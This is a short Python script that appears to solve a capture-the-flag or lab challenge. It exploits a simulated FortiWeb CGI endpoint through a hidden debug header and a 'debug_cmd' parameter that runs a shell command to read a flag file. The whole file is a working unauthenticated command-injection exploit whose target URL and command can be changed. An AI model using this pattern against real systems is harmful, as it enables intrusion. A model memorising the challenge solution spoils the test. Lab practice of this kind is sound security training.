import requests
import sys

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:18080"

# Exploit the simulated FortiWeb unauth RCE via debug header and debug_cmd param
url = f"{BASE}/cgi-bin/vuln.cgi"
headers = {"X-FW-Debug": "debug-FTW-2025"}
params = {
    "action": "backup",
    "target": "logs",
    "debug_cmd": "cat /opt/fortiweb/flag.txt"
}

r = requests.get(url, headers=headers, params=params, timeout=5)
print(r.text)
